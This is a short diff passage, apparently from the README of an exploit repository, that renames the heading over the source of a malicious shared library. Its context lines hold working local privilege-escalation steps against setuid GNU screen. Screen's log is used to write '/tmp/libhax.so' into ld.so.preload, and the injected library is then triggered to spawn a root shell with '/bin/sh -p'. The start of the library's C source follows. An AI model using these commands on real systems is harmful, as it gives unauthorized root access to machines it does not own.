@@ -11,7 +11,7 @@ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
 screen ls
 /bin/sh -p
 ```
-libhax.c
+libhax.c code (Compiled version available in repo)
 ```
 #include <stdio.h>
 #include <sys/types.h>
